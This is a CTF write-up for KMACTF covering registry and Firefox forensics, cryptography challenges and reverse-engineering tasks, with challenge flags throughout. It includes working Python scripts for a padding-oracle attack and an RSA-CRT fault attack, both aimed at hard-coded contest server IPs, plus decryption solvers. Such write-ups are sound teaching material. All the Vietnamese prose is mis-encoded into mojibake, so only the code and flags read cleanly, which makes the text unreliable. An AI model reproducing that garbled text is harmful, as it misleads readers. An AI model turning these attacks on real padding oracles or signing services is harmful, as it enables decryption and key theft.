Trong Windows, hive *HKEY_CURRENT_USER* ƒë∆∞·ª£c ƒë·∫∑t t·∫°i th∆∞ m·ª•c user v·ªõi t√™n NTUSER.DAT
[![4.png](https://camo.githubusercontent.com/151a90b35ab4bd20ff518db33a797df52447c1d89936ea156ee93f07ecc4c79b/68747470733a2f2f692e696d6775722e636f6d2f4f7963675167632e706e67)](https://camo.githubusercontent.com/151a90b35ab4bd20ff518db33a797df52447c1d89936ea156ee93f07ecc4c79b/68747470733a2f2f692e696d6775722e636f6d2f4f7963675167632e706e67)

```
KMACTF{ntuser_
```

#### Q2

```
What is the user of the computer in use? Flint length is 8 
```

T·ª´ hive *HKEY_CURRENT_USER* ch√∫ng ta nh·∫≠n ƒë∆∞·ª£c ·ªü tr√™n, theo ƒë∆∞·ªùng d·∫´n *Control Panel\Desktop\Wallpaper*, ta c√≥ ƒë∆∞·ªõng d·∫´n ƒë·∫øn h√¨nh n·ªÅn Desktop c·ªßa user:
[![5.png](https://camo.githubusercontent.com/b9f1018155e0e9b5ae96b37740c9e493a914683c6293f18b92d56ab66e0bf058/68747470733a2f2f692e696d6775722e636f6d2f796369477a39502e706e67)](https://camo.githubusercontent.com/b9f1018155e0e9b5ae96b37740c9e493a914683c6293f18b92d56ab66e0bf058/68747470733a2f2f692e696d6775722e636f6d2f796369477a39502e706e67)

```
KMACTF{ntuser_kcsc0x21_
```

#### Q3

```
This section is hosted on the Internet 
```

Ch√∫ng ta ki·ªÉm tra th∆∞ m·ª•c ***Roaming***, trong ƒë√≥ c√≥ th∆∞ m·ª•c *Mozilla*, theo google th√¨ Firefox l∆∞u tr·ªØ user profile ·ªü ƒë√¢y, bao g·ªìm Bookmarks, History, Cookie v√† l·ªãch s·ª≠ Download,...
Ch√∫ng ta ti·∫øn h√†nh m·ªü file *places.sqlite* t·ª´ profile folder c·ªßa Firefox
[![6.png](https://camo.githubusercontent.com/21e4ab1bb6f747fd126f564e6456f54fdf17a8000e30728b557f8bff7f836778/68747470733a2f2f692e696d6775722e636f6d2f4a4762366e6e462e706e67)](https://camo.githubusercontent.com/21e4ab1bb6f747fd126f564e6456f54fdf17a8000e30728b557f8bff7f836778/68747470733a2f2f692e696d6775722e636f6d2f4a4762366e6e462e706e67)
b·∫±ng [DB Browser for SQLite](https://sqlitebrowser.org/dl/)
L·ªãch s·ª≠ truy c·∫≠p ·ªü table *moz_places*
[![7.png](https://camo.githubusercontent.com/4c4deb61a6e39931e2082752bce5cb1753db5ec22ed33c6807915de2054c5b31/68747470733a2f2f692e696d6775722e636f6d2f687058364b344d2e706e67)](https://camo.githubusercontent.com/4c4deb61a6e39931e2082752bce5cb1753db5ec22ed33c6807915de2054c5b31/68747470733a2f2f692e696d6775722e636f6d2f687058364b344d2e706e67)
Ch√∫ng ta c√≥ th·ªÉ th·∫•y (~~b√†i vi·∫øt v·ªÅ v·ª• 2 v·ª£ ch·ªìng m·∫•t t√≠ch ·ªü Thanh Ho√°~~) c√≥ m·ªôt url t·ª´ github: https://raw.githubusercontent.com/dianguc38/CTF/master/part2.md
[![8.png](https://camo.githubusercontent.com/b6bca63e24dc398c13c190dd7946149ba44ce008afa3a2be8b85f8910b433ead/68747470733a2f2f692e696d6775722e636f6d2f5332316f386b642e706e67)](https://camo.githubusercontent.com/b6bca63e24dc398c13c190dd7946149ba44ce008afa3a2be8b85f8910b433ead/68747470733a2f2f692e696d6775722e636f6d2f5332316f386b642e706e67)

```
KMACTF{ntuser_kcsc0x21_w4s_h3r3_
```

#### Q4

```
What is the name of the final file downloaded by the victim? Hint length is 4
```

T·ª´ file *places.sqlite* ·ªü Q3, ta c√≥ th·ªÉ truy c·∫≠p l·ªãch s·ª≠ download b·∫±ng table *moz_annos*
[![9.png](https://camo.githubusercontent.com/77c262349ed24c8cba9800faa91468e74289446cf517454069684ff7cfea7832/68747470733a2f2f692e696d6775722e636f6d2f486577355045732e706e67)](https://camo.githubusercontent.com/77c262349ed24c8cba9800faa91468e74289446cf517454069684ff7cfea7832/68747470733a2f2f692e696d6775722e636f6d2f486577355045732e706e67)
Chuy·ªÉn th·ªùi gian sang d·∫°ng c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c
[![10.png](https://camo.githubusercontent.com/e6dd3b02fcb12be638575bee6f8d577147ac1473b0866985b0f7ed563b6bc027/68747470733a2f2f692e696d6775722e636f6d2f4d6f6576536c622e706e67)](https://camo.githubusercontent.com/e6dd3b02fcb12be638575bee6f8d577147ac1473b0866985b0f7ed563b6bc027/68747470733a2f2f692e696d6775722e636f6d2f4d6f6576536c622e706e67)

```
KMACTF{ntuser_kcsc0x21_w4s_h3r3_war601}
```

Tuy nhi√™n th√¨ flag b·ªã sai, v√† m√¨nh ƒë√£ xin anh Kh·∫£i hint, v√† ch√∫ng ta c√≥:

```
Hint: Renamed file has more information than you think!
```

Sau m·ªôt h·ªìi ƒë·ªçc t·ª´ng key trong *HKEY_CURRENT_USER*, m√¨nh ƒë√£ t√¨m th·∫•y flag ·ªü key
*Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs*
[![11.png](https://camo.githubusercontent.com/873c1f50f4af86bba597575f2ce59586a438653c26e2f3bef0a06848601771f2/68747470733a2f2f692e696d6775722e636f6d2f596b573371777a2e706e67)](https://camo.githubusercontent.com/873c1f50f4af86bba597575f2ce59586a438653c26e2f3bef0a06848601771f2/68747470733a2f2f692e696d6775722e636f6d2f596b573371777a2e706e67)
Nh√¨n th·ªùi gian th√¨ file war601 download sau c√πng, tuy nhi√™n ƒë·ªÅ b√†i y√™u c·∫ßu *final file downloaded by the victim* ch·ª© kh√¥ng ph·∫£i *final file downloaded* n√™n ch√∫ng ta c√≥ flag m·ªõi

```
KMACTF{ntuser_kcsc0x21_w4s_h3r3_0808}
```

----



# <a name="CRYPTOGRAPHY">CRYPTOGRAPHY üåª

Credit write-up: [Uyen](https://github.com/hhthanhuyen)

### Ciphers

> Caesar cipher and Affine cipher aren't safe enough, how about Caesar-then-Affine?

chall.py

```
from Crypto.Util.number import getPrime
from random import randint
from flag import FLAG

assert FLAG.startswith(b"KMA{") and FLAG.endswith(b"}")
n = getPrime(32)

def caesar_affine(msg, key):
    ct = []
    for m in msg:
        c = (m + key[0]) % n
        c = (key[1]*c + key[2]) % n
        ct.append(c)
    return ct

enc = list(FLAG)
for i in range(32):
    key = (randint(1,n), randint(1,n-1), randint(1,n))
    enc = caesar_affine(enc, key)

#print(n) :)
print(enc)

# [3672812146, 1322164696, 3179556757, 325408115, 451283413, 83903322, 1626607138, 388345764, 1070414100, 1007476451, 1626607138, 1689544787, 577158711, 1689544787, 3358123901, 4040192237, 2738993214, 2676055565, 1007476451, 388345764, 1070414100, 2749239017, 3358123901, 577158711, 451283413, 3179556757, 2676055565, 577158711, 3358123901, 3053681459, 388345764, 577158711, 1070414100, 3358123901, 4040192237, 2738993214, 1689544787, 2308675474, 1563669489, 2560426070, 577158711, 2434550772, 1689544787, 4040192237, 3295186252, 2738993214, 1070414100, 388345764, 2676055565, 2056924878]
```

Khi m√£ h√≥a Affine m·ªôt b·∫£n r√µ `m` hai l·∫ßn v·ªõi kh√≥a kh√°c nhau l·∫ßn l∆∞·ª£t l√† (a1,b1) v√† (a2,b2) thu ƒë∆∞·ª£c `c = a2*(a1*m + b1) + b2 = (a1*a2)*m + (a2*b1 + b2) (mod n)`.

C√≥ th·ªÉ th·∫•y hai l·∫ßn Affine s·∫Ω th√†nh m·ªôt l·∫ßn Affine kh√°c v·ªõi `a' = a1*a2, b' = a2*b1 + b2`; do gcd(a1,n) = gcd(a2,n) = 1 (ƒëi·ªÅu ki·ªán m√£ Affine gcd(a,n) = 1) n√™n gcd(a1*a2,n) c≈©ng b·∫±ng 1. Caesar c≈©ng l√† m√£ Affine v·ªõi a = 1 n√™n challenge tr·ªü th√†nh m·ªôt l·∫ßn Affine, `c = A*m + B mod n`, hidden n, A, B.

Bi·∫øt ƒë∆∞·ª£c b·∫£n m√£ t∆∞∆°ng ·ª©ng c·ªßa `KMA{}` l√† [3672812146, 1322164696, 3179556757, 325408115, 2056924878].

ƒê·∫∑t m' v√† c' l√† hi·ªáu c·ªßa hai c·∫∑p (m,c) b·∫•t k√¨, `m' = m_i - m_j, c' = c_i - c_j, n√™n c' = A * m' (mod n)`.

N·∫øu c√≥ 2 ph∆∞∆°ng tr√¨nh:

```
A * m1' = c1' (mod n); A * m2' = c2' (mod n)
A * m1' * m2' = c1' * m2' (mod n); A * m2' * m1' = c2' * m1' (mod n); Nh√¢n hai v·∫ø c·ªßa t·ª´ng ph∆∞∆°ng tr√¨nh.
0 = c1' * m2' - c2' * m1' (mod n); Tr·ª´ hai ph∆∞∆°ng tr√¨nh v·ªõi nhau.
```

`Factor(c1' * m2' - c2' * m1')` s·∫Ω t√¨m ƒë∆∞·ª£c n. Sau khi c√≥ n, t√≠nh `A = c'*m'^-1 (mod n), B = c - A*m (mod n)`. D√πng n, A, B gi·∫£i m√£ ph·∫ßn c√≤n l·∫°i c·ªßa flag.

```
>>> m = list(b'KMA{}')
>>> c = [3672812146, 1322164696, 3179556757, 325408115, 2056924878]
>>> (c[0]-c[1])*(m[2]-m[3]) - (c[2]-c[3])*(m[0]-m[1])
-130629254816
>>> # Factor(-130629254816) = -1 * 25 * 4082164213, n = 4082164213.
>>> n = 4082164213
>>> A = (c[0]-c[1])*pow(m[0]-m[1], -1, n) % n
>>> B = (c[0] - A*m[0]) % n
>>> c = [3672812146, 1322164696, 3179556757, 325408115, 451283413, 83903322, 1626607138, 388345764, 1070414100, 1007476451, 1626607138, 1689544787, 577158711, 1689544787, 3358123901, 4040192237, 2738993214, 2676055565, 1007476451, 388345764, 1070414100, 2749239017, 3358123901, 577158711, 451283413, 3179556757, 2676055565, 577158711, 3358123901, 3053681459, 388345764, 577158711, 1070414100, 3358123901, 4040192237, 2738993214, 1689544787, 2308675474, 1563669489, 2560426070, 577158711, 2434550772, 1689544787, 4040192237, 3295186252, 2738993214, 1070414100, 388345764, 2676055565, 2056924878]
>>> flag = bytes([(i-B)*pow(A,-1,n) % n for i in c])
>>> flag
b'KMA{mUltiple_encrypti0n_mAy_nOt_increasE_Security}'
```

### Free Flag

> It's really a free flag, you need only ask.

chall.py

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from os import urandom
from flag import FLAG


def xor(x,y):
        return bytes([a^b for a,b in zip(x,y)])

class Challenge:
    def __init__(self, key):
        self.key = key
        self.message = b"Hi, I'm here for the flag, plz give it to me."
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        plaintext = bytes(16) + pad(plaintext, 16)
        ciphertext = urandom(16) # IV
        for i in range(16,len(plaintext),16):
            tmp = xor(xor(plaintext[i:i+16], plaintext[i-16:i]), ciphertext[i-16:i])
            tmp = self.cipher.encrypt(tmp)
            ciphertext += tmp
        return ciphertext
    
    def decrypt(self, ciphertext):
        plaintext = bytes(16)
        for i in range(16,len(ciphertext),16):
            tmp = self.cipher.decrypt(ciphertext[i:i+16])
            plaintext += xor(xor(tmp, plaintext[i-16:i]), ciphertext[i-16:i])
        plaintext = plaintext[16:]

        try:
            plaintext = unpad(plaintext,16)
            if plaintext == self.message:
                return FLAG
            else:
                return "Try again."
        except Exception as e:
            return e

if __name__ == "__main__":
    chall = Challenge(urandom(16))
    while True:
        try:
            ciphertext = bytes.fromhex(input())
            assert len(ciphertext) % 16 == 0 and len(ciphertext) >= 32
            print(chall.decrypt(ciphertext))
        except:
            break

```

B√†i y√™u c·∫ßu nh·∫≠p `ciphertext`, n·∫øu decrypt `ciphertext` l√† `"Hi, I'm here for the flag, plz give it to me."` th√¨ g·ª≠i `flag`, n·∫øu padding sai s·∫Ω g·ª≠i th√¥ng b√°o l·ªói, padding ƒë√∫ng th√¨ g·ª≠i `Try again`.

[Padding oracle attack](https://en.wikipedia.org/wiki/Padding_oracle_attack)

PCBC mode decryption - Wikipedia

[![PCBC](https://user-images.githubusercontent.com/80334943/131240368-8ce9d929-fc72-46fe-aebc-0cbca0800578.jpg)](https://user-images.githubusercontent.com/80334943/131240368-8ce9d929-fc72-46fe-aebc-0cbca0800578.jpg)

Nh∆∞ v·∫≠y ph·∫£i construct b·∫£n m√£ cho `message` b"Hi, I'm here for the flag, plz give it to me.\x03\x03\x03" khi ƒë√£ th√™m padding, chia th√†nh 3 AES block m·ªói block 16 byte.

```
Hi, I'm here for            (M1)
 the flag, plz g            (M2)
ive it to me.\x03\x03\x03   (M3)
```

X√©t tr∆∞·ªùng h·ª£p b·∫£n m√£ ch·ªâ g·ªìm IV | C (v·ªõi C l√† m·ªôt block b·∫£n m√£ b·∫•t k√¨), c√≥ th·ªÉ thay ƒë·ªïi IV ƒë·ªÉ th·ª±c hi·ªán padding oracle attack v√† t√¨m ƒë∆∞·ª£c b·∫£n r√µ c·ªßa C.

ƒê·ªÉ t√¨m b·∫£n m√£ c·ªßa `message`, b·∫Øt ƒë·∫ßu t·ª´ m·ªôt block `C3` b·∫•t k√¨, padding oracle attack ƒë·ªÉ t√¨m b·∫£n r√µ c·ªßa C3 l√† D(C3). Block `C2 = M2 XOR M3 XOR D(C3)`. T∆∞∆°ng t·ª±, padding oracle attack ƒë·ªÉ t√¨m b·∫£n r√µ c·ªßa C2 l√† D(C2). Block `C1 = M1 XOR M2 XOR D(C2)`. Padding oracle attack th√™m m·ªôt l·∫ßn n·ªØa ƒë·ªÉ t√¨m D(C1). `IV = M1 XOR D(C1)`. B·∫£n m√£ c·∫ßn t√¨m l√† `IV | C1 | C2 | C3`.

```
from pwn import xor, remote
from Crypto.Util.Padding import pad, unpad
from os import urandom

r = remote('20.42.60.42', 9992)

msg = pad(b"Hi, I'm here for the flag, plz give it to me.",16)
ct = [urandom(16)]
for cnt in range(2,-1,-1):
    C = ct[-1]
    decrypted = []
    for c in range(1,17):
        print(c, end=' ')
        IV = list(bytes(16))
        for i in range(256):
            IV[-c] = i
            for j in range(1,c):
                IV[-j] = decrypted[-j] ^ c

            r.sendline((bytes(IV) + C).hex())
            res = r.recvuntil("\n",drop=True)
            if res == b"Try again.":
                print(i,res)
                decrypted = [i^c] + decrypted
                break
    if cnt != 0:
        ct.append(xor(xor(bytes(decrypted), msg[16*cnt:16*cnt+16]), msg[16*cnt-16:16*cnt]))
    else:
        ct.append(xor(bytes(decrypted), msg[16*cnt:16*cnt+16]))

ct = b''.join(ct[::-1])
r.sendline(ct.hex())
print(r.recvuntil("\n",drop="True"))
# KMA{P4ddIng_0r4clE_4tt4ck}
```

### Random Fault

> I've just found a weird signing server, but it seems broken. Can you get the flag?

chall.py

```
from Crypto.Util.number import getStrongPrime
from random import getrandbits
from flag import FLAG
from os import urandom


class RSA:
    def __init__(self, p, q, e=65537):
        self.N = p*q
        self.e = e
        self.p = p
        self.q = q
        self.dp = pow(e, -1, p-1)
        self.dq = pow(e, -1, q-1)
        self.inv_q = pow(q, -1, p)

    def encrypt(self, m):
        return pow(m, self.e, self.N)

    def sign(self, m):
        Sp = pow(m, self.dp, self.p) if getrandbits(1) else pow(m, self.dp, self.p) | getrandbits(32)
        Sq = pow(m, self.dq, self.q) if getrandbits(1) else pow(m, self.dq, self.q) | getrandbits(32)
        S = Sq + self.q * (((Sp - Sq)*self.inv_q) % self.p)
        return S


if __name__ == "__main__":
    p = getStrongPrime(1024, e=65537)
    q = getStrongPrime(1024, e=65537)
    rsa = RSA(p, q)
    FLAG = int.from_bytes(urandom(245 - len(FLAG)) + FLAG, "big")
    for i in range(32):
        try:
            m = int(input("m: "))
            assert 1 < m < p*q
            print(rsa.sign(m))
        except:
            exit("Invalid input.")
    print(f"Encrypted flag: {rsa.encrypt(FLAG)}")
```

[RSA - Using the Chinese remainder algorithm](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Using_the_Chinese_remainder_algorithm)

Fault attack on RSA-CRT, b√†i y√™u c·∫ßu g·ª≠i m (1 < m < n), tr·∫£ v·ªÅ gi√° tr·ªã `m^d mod n` (s·ª≠ d·ª•ng CRT). L·ªói x·∫£y ra khi `getrandbits(1) = 0` n√™n Sp v√† Sq khi ƒë√∫ng khi sai.

B·∫£ng d∆∞·ªõi t√≥m t·∫Øt S tr·∫£ v·ªÅ t∆∞∆°ng ·ª©ng v·ªõi (Sp, Sq), c·ªôt th·ª© hai l√† gi√° tr·ªã `S mod p`, c·ªôt th·ª© ba l√† gi√° tr·ªã `S mod q`, v√† `≈ú` l√† k√≠ hi·ªáu c√≥ l·ªói x·∫£y ra.

![image](https://user-images.githubusercontent.com/85006768/131309733-1397a1d5-49d3-4ab1-a5be-0c76bed430d6.png)

Gi·∫£ s·ª≠ g·ª≠i 32 `m` gi·ªëng nhau, trong c√°c k·∫øt qu·∫£ tr·∫£ v·ªÅ c√≥ 32 gi√° tr·ªã S, `(Sp, Sq)` c√≥ th·ªÉ nh·∫≠n bi·∫øt ƒë∆∞·ª£c v√¨ S1 c·ªë ƒë·ªãnh, xu·∫•t hi·ªán nhi·ªÅu l·∫ßn.

C√≥ `S1 - S2 = 0 (mod p)` v√† `S1 - S3 = 0 (mod q)`, n·∫øu t√¨m ƒë∆∞·ª£c m·ªôt c·∫∑p (S,S') sao cho S kh√°c S', S v√† S' c√πng l√† S2 ho·∫∑c c√πng l√† S3 th√¨ `gcd(|S1 - S|, |S1 - S'|)` c√≥ th·ªÉ ch·ª©a m·ªôt ∆∞·ªõc c·ªßa n.

```
from itertools import combinations
from pwn import remote
from Crypto.Util.number import *

r = remote('20.205.163.226', 9993)

s = []
for i in range(32):
    r.recvuntil("m: ")
    r.sendline("2")
    s.append(int(r.recvline().strip()))
r.recvuntil("Encrypted flag: ")
enc = int(r.recvline().strip())
r.close()

for i in s:
    if s.count(i) != 1:
        ss = i
        break

c = combinations(set(s),2)
primes = []
for i in c:
    tmp = GCD(abs(ss-i[0]), abs(ss-i[1]))
    if isPrime(tmp) and tmp.bit_length() > 1000 and tmp not in primes:
        primes.append(tmp)
        if len(primes) == 2:
            break

phi = (primes[0] - 1)*(primes[1] - 1)
d = pow(65537,-1,phi)
print(long_to_bytes(pow(enc,d,primes[0]*primes[1])))
# KMA{__fAulty_faUlty_SignaturE__}
```



----


# <a name="REVERSE">REVERSE üê¨

Credit write-up: [Th√†nh Draw](https://github.com/n0bit4lsm3)

### recursion

[![h0](https://user-images.githubusercontent.com/38103453/131249486-0ff4b006-f1d1-49ce-a552-def2142ee28e.PNG)](https://user-images.githubusercontent.com/38103453/131249486-0ff4b006-f1d1-49ce-a552-def2142ee28e.PNG)

ƒê·∫ßu ti√™n t√¥i th·∫•y trong ph·∫ßn string c√≥ m·ªôt const ƒë·∫∑c bi·ªát.

[![h1](https://user-images.githubusercontent.com/38103453/131249489-f93fe869-1306-4fe3-b2ff-56b26733196f.PNG)](https://user-images.githubusercontent.com/38103453/131249489-f93fe869-1306-4fe3-b2ff-56b26733196f.PNG)

Xref theo string n√†y, n√≥ s·∫Ω d·∫´n t·ªõi h√†m `sub_4014DD()`.

[![h2](https://user-images.githubusercontent.com/38103453/131249490-fdcba66f-9e5f-4bad-97aa-e5095cbf9aea.PNG)](https://user-images.githubusercontent.com/38103453/131249490-fdcba66f-9e5f-4bad-97aa-e5095cbf9aea.PNG)

·ªû ƒë√¢y, ta th·∫•y `dword_404020` s·∫Ω l√† m·∫£ng ch·ª©a c√°c gi√° tr·ªã ƒë·ªÉ ph·ª•c v·ª• vi·ªác t√≠nh to√°n, v√† l√†m tham s·ªë cho h√†m `sub_401460()`. K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa h√†m `sub_401460()` ƒë√≥ ch√≠nh l√† flag v√† s·∫Ω ƒë∆∞·ª£c in ra console.

[![h3](https://user-images.githubusercontent.com/38103453/131249491-992160f9-6491-4d9c-b841-3d6542399b7d.PNG)](https://user-images.githubusercontent.com/38103453/131249491-992160f9-6491-4d9c-b841-3d6542399b7d.PNG)

Ph√¢n t√≠ch v√†o h√†m `sub_401460()`, ta th·∫•y n√≥ s·ª≠ d·ª•ng ƒë·ªá quy ƒë·ªÉ t√≠nh to√°n. H·∫°n ch·∫ø c·ªßa ƒë√™ quy l√† n·∫øu s·ªë truy·ªÅn v√†o c√†ng l·ªõn th√¨ t·ªëc ƒë·ªô t√≠nh to√°n c√†ng ch·∫≠m. N√™n khi t√¥i ch·∫°y file th√¨ kh√¥ng nh·∫≠n ƒë∆∞·ª£c flag. :((

ƒê·ªÉ gi·∫£i quy·∫øt ƒë∆∞·ª£c b√†i to√°n n√†y th√¨ ch√∫ng ta s·∫Ω kh·ª≠ ƒë·ªá quy b·∫±ng c√°ch t√¨m quy lu·∫≠t c·ªßa n√≥.

H√†m n√†y quy lu·∫≠t s·∫Ω nh∆∞ sau:

```
      a[0] = 0
      a[1] = 1
      a[2] = 2
      a[3] = (75 * a[2]) + (3 * a[1]) + (17 * a[0])
      a[4] = (75 * a[3]) + (3 * a[2]) + (17 * a[1])
```

T·ª´ ƒë√≥ ta c√≥ ƒë∆∞·ª£c script nh∆∞ b√™n d∆∞·ªõi:

```
enc = [7, 9, 19, 5, 262, 182, 33, 112, 134, 12, 136, 55, 309, 33, 239, 84, 405, 55, 121, 84, 215, 33, 134, 12, 239, 33, 23, 239, 23, 379, 309, 37, 41]
flag = ""
for i_enc in range(len(enc)):
	data = [0 for i in range(enc[i_enc] + 1)]
	for i in range(0, enc[i_enc] + 1):
		if i == 0:
			data[0] = 0
		elif i == 1:
			data[1] = 1
		elif i == 2:
			data[2] = 2
		else:
			data[i] = (75 * data[i - 1]) + (3 * data[i - 2]) + (17 * data[i - 3])
	flag += chr(data[enc[i_enc]] & 0xFF)

print(flag)
```

Flag l√†: `KMA{pH180n4Cc1_r3CurS10n_1s_sUck}`

### Encryptor

[![h4](https://user-images.githubusercontent.com/38103453/131249492-0f52c00b-0370-4e34-a8c9-fb0167cc3648.PNG)](https://user-images.githubusercontent.com/38103453/131249492-0f52c00b-0370-4e34-a8c9-fb0167cc3648.PNG)

ƒê√¢y l√† m·ªôt ch∆∞∆°ng tr√¨nh m√£ h√≥a file. Load v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.

[![h5](https://user-images.githubusercontent.com/38103453/131249495-97e21f68-22b0-4fd7-9d08-b7aaff1e1eb0.PNG)](https://user-images.githubusercontent.com/38103453/131249495-97e21f68-22b0-4fd7-9d08-b7aaff1e1eb0.PNG)

H√†m `main()` ch∆∞∆°ng tr√¨nh g·ªìm 3 h√†m:

- `f_open_file()` s·∫Ω th·ª±c hi·ªán m·ªü, ƒë·ªçc file v√† l∆∞u data v√†o memory, ƒë·ªãa ch·ªâ c·ªßa memory n√†y s·∫Ω l∆∞u v√†o bi·∫øn **argc**
- `f_encrypt_file()` m√£ h√≥a data
- `f_save_encrypted_file()` l∆∞u encrypted data v√†o file v·ªõi ƒë∆∞·ªùng d·∫´n l√† file g·ªëc + ".encrypt" extension.


[![h6](https://user-images.githubusercontent.com/38103453/131249496-57469c90-ed69-40c4-80ed-8d47269e020f.PNG)](https://user-images.githubusercontent.com/38103453/131249496-57469c90-ed69-40c4-80ed-8d47269e020f.PNG)

T√¥i ti·∫øn h√†nh ph√¢n t√≠ch s√¢u v√†o `f_encrypt_file()`. T√¥i th·∫•y m·ªói l·∫ßn m√£ h√≥a 8 bytes. Cu·ªëi c√πng data m√£ h√≥a ƒë√≥ s·∫Ω ƒë∆∞·ª£c l∆∞u l·∫°i v√†o bi·∫øn `data` b·∫±ng h√†m `memmove()`.

T·ª´ ƒë√¢y t√¥i s·∫Ω vi·∫øt script ƒë·ªÉ decrypt l·∫°i file b·∫±ng **z3** python.

```
from z3 import *

with open("flag.jpg.encrypt", "rb") as f:
	enc = f.read()

data = [0 for i in range(len(enc))]

for i_len_enc in range(0, len(enc) - 1, 8):

	inp = [BitVec("%d" % i, 8) for i in range(8)]
	s = Solver()
	rs = 0

	for i in range(0, 8):
		rs = 0
		for j in range(0, 8):
			rs += ((inp[j] >> i) & 1) << j
		rs = 0xFF - (rs & 0xFF) + 1

		s.add(rs == enc[i_len_enc + i])

	if s.check() == sat:
		flag = []
		m = s.model()
		md = sorted([(d, m[d]) for d in m], key = lambda x: str(x[0]))
		for i in md:
			flag.append(i[1].as_long())
		for i in range(0, 8):
			data[i_len_enc + i] = flag[i]

with open("flag.jpg", "wb") as f:
	f.write(bytearray(data))

print("Done!")
```

Flag l√†: `KMA{Encryp7_w17H0u7_x0r}`

### Amazing Good Mood

[![h7](https://user-images.githubusercontent.com/38103453/131249498-353caf0f-4804-47a5-af33-a228f69be3a5.PNG)](https://user-images.githubusercontent.com/38103453/131249498-353caf0f-4804-47a5-af33-a228f69be3a5.PNG)

Theo nh∆∞ d·∫°ng ƒë·ªÅ n√†y, t√¥i m·∫°nh d·∫°ng ƒëo√°n l√† flag ƒë√£ ƒë∆∞·ª£c gi·∫•u v√†o c√°c pixel c·ªßa ·∫£nh :))

[![h8](https://user-images.githubusercontent.com/38103453/131249499-1444c5b7-c03b-448f-88c6-5ed3188fc677.PNG)](https://user-images.githubusercontent.com/38103453/131249499-1444c5b7-c03b-448f-88c6-5ed3188fc677.PNG)

Load file v√†o **CFF Explore** th√¨ t√¥i nh·∫≠n ra file ƒë∆∞·ª£c vi·∫øt b·∫±ng **C#**.

Load file v√†o **dnSpy** ƒë·ªÉ ph√¢n t√≠ch.

[![h9](https://user-images.githubusercontent.com/38103453/131249500-64674cdc-b73a-4613-867e-1f9abc5b5b31.PNG)](https://user-images.githubusercontent.com/38103453/131249500-64674cdc-b73a-4613-867e-1f9abc5b5b31.PNG)

T·∫°i h√†m `main()`, ta th·∫•y ch∆∞∆°ng tr√¨nh y√™u c·∫ßu 3 tham s·ªë: ƒê∆∞·ªùng d·∫´n file bitmap g·ªëc, ƒë∆∞·ªùng d·∫´n file ch·ª©a secret c·∫ßn gi·∫•u v√†o ·∫£nh, ƒë∆∞·ªùng d·∫´n file bitmap s·∫Ω ƒë∆∞·ª£c l∆∞u.

Ta ch√∫ √Ω t·∫°i d√≤ng 172 v√† 173, s·∫Ω d√πng ƒë·ªÉ l·∫•y c√°c bytes secret v√† ki·ªÉm tra chi·ªÅu d√†i secret ph·∫£i b·∫±ng 24.

[![h10](https://user-images.githubusercontent.com/38103453/131249501-009b9d36-a3ad-4c44-bde4-8fd6ef75dc9f.PNG)](https://user-images.githubusercontent.com/38103453/131249501-009b9d36-a3ad-4c44-bde4-8fd6ef75dc9f.PNG)

H√†m `Program.h()` s·∫Ω l√†m nhi·ªám v·ª• m√£ h√≥a secret, t√¥i nh·∫≠n ra ƒë√¢y l√† m√£ h√≥a **RC4**.

Key s·∫Ω ƒë∆∞·ª£c decode **base64** c·ªßa bi·∫øn `Program.yy`.

ƒê·∫∑c bi·ªát ch√∫ √Ω, **nh·∫•n chu·ªôt ph·∫£i -> Analyze**, ta s·∫Ω th·∫•y bi·∫øn n√†y c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng t·∫°i h√†m `Program.Init()`.

[![h11](https://user-images.githubusercontent.com/38103453/131249502-19a9da6b-4295-441e-9973-a599b71360d7.PNG)](https://user-images.githubusercontent.com/38103453/131249502-19a9da6b-4295-441e-9973-a599b71360d7.PNG)

H√†m n√†y ƒë∆∞·ª£c g·ªçi ·ªü ƒë·∫ßu h√†m `main()`, n√≥ th·ª±c hi·ªán ki·ªÉm tra debug b·∫±ng h√†m `IsDebuggerPresent()`. N·∫øu ƒë√∫ng th√¨ s·∫Ω gh√©p th√™m chu·ªói `QDIwMjI=` v√†o bi·∫øn `Program.yy`, ng∆∞·ª£c l·∫°i th√¨ gh√©p th√™m chu·ªói `QDEyMzQ=`.

T·ª´ ƒë√¢y ta c√≥ th·ªÉ decode base64 chu·ªói `S01BQ1RGQDEyMzQ=` s·∫Ω ƒë∆∞·ª£c key l√† `KMACTF@1234`.

[![h12](https://user-images.githubusercontent.com/38103453/131249504-ea793a7c-d9f1-4b1b-9bad-bfc233223cd7.PNG)](https://user-images.githubusercontent.com/38103453/131249504-ea793a7c-d9f1-4b1b-9bad-bfc233223cd7.PNG)

Sau khi m√£ h√≥a secret. H√†m `Program.j()` s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ gi·∫•u encrypted secret theo quy t·∫Øc nh∆∞ sau:

- **red**: s·∫Ω gi·ªØ 3 bit t√≠nh t·ª´ bit th·∫•p nh·∫•t
- **green**: s·∫Ω gi·ªØ 3 bit ti·∫øp theo
- **blue**: s·∫Ω gi·ªØ 3 bit c√≤n l·∫°i

T·ª´ nh·ªØng g√¨ t√¥i ph√¢n t√≠ch, t√¥i s·∫Ω vi·∫øt m·ªôt ƒëo·∫°n C# ƒë·ªÉ dump c√°c pixel t·ª´ file `encrypted.bmp` sau ƒë√≥ ph·ª•c h·ªìi l·∫°i encrypted secret. Cu·ªëi c√πng s·∫Ω decrypt b·∫±ng **RC4**.

```
static void Main(string[] args)
{
      Bitmap image1 = new Bitmap("C:\\Users\\ChiThanh\\Desktop\\kmactf\\re\\encrypted.bmp");
      int x, y;
      int z = 0;

      for (x = 0; x < image1.Width; x++)
      {
             for (y = 0; y < image1.Height; y++)
             {   
                   if (z >= 24) {
                         System.Environment.Exit(0);
                   }
                   z += 1;
                   Color pixelColor = image1.GetPixel(x, y);
                   int result = (pixelColor.R << 6) + (pixelColor.G << 3) + pixelColor.B;
                   Console.Write(result.ToString("X2"));
             }
      }
}
```

Flag l√† `KMA{d0nT_tRu$t_m3_hihi!}`

### ps

[![h13](https://user-images.githubusercontent.com/38103453/131249505-f142dc8b-d335-494c-bb2d-3e831884c9e4.PNG)](https://user-images.githubusercontent.com/38103453/131249505-f142dc8b-d335-494c-bb2d-3e831884c9e4.PNG)

